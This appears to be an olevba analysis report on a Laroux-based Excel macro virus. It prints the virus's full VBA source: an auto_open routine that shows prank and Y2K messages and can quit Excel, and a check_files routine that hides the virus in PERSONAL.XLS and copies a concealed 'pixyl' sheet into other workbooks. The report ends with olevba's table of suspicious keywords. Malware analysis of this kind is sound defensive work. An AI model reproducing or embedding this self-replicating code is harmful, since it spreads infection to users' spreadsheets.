olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-b8ceebcc01068ca9035ea9b81c060ad633cadcc1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Pixyl.bas 
in file: Virus.MSExcel.Laroux-based-b8ceebcc01068ca9035ea9b81c060ad633cadcc1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Pixyl'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo DONE:
    Randomize
    Application.OnSheetActivate = "check_files"
    lf = Chr(10)
    
    
    If Format(Date, "YYYYMM") = 200001 Then
        MsgBox "Wow, you made it into the next millenium!"
    ElseIf Format(Date, "YYYY") > 1998 Then
        m = Int(Rnd * 10)
        Select Case m
            Case 0
                tmsg = "Hello, How are you?"
            Case 1
                tmsg = "What goes up must come down." & _
                    lf & "What goes up and down must come."
            Case 2
                tmsg = "doy2k"
            Case 3
                tmsg = "Do you want to go home?"
                butts = 4
            Case 4
                Shell "NOTEPAD.EXE", 3
            Case Else
                'MkDir Str(Rnd)
        End Select
        If tmsg = "doy2k" Then
            y = 1999 - Year(Date)
            m = 11 - Month(Date)
            d = 30 - Day(Date)
            h = 23 - Format(Now, "hh")
            mn = 59 - Minute(Time)
            s = 59 - Second(Time)
            v = ", "
        
            msg = "You have:" & lf & _
            y & " year(s)" & v & _
            m & " month(s)" & v & _
            d & " day(s)" & v & _
            h & " hour(s)" & v & _
            mn & " minute(s)" & v & _
            s & " second(s)" & v & _
            "until Y2K." & lf & _
            vbcrlf & _
            "Do you comply?"
            If MsgBox(msg, 4, "Millenium Compliancy Check") = 7 Then Application.Quit
        Else
            If tmsg <> "" Then
                If mtitle = "" Then
                    MsgBox tmsg, butts
                Else
                    MsgBox tmsg, butts, mtitle
                End If
            End If
        End If
    End If
    
DONE:
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("pixyl").Visible = True
    Sheets("pixyl").Select
    Sheets("pixyl").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("pixyl").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "pixyl" Then
        Workbooks("PERSONAL.XLS").Sheets("pixyl").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("pixyl").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
End Select
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Pixy
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |NOTEPAD.EXE         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

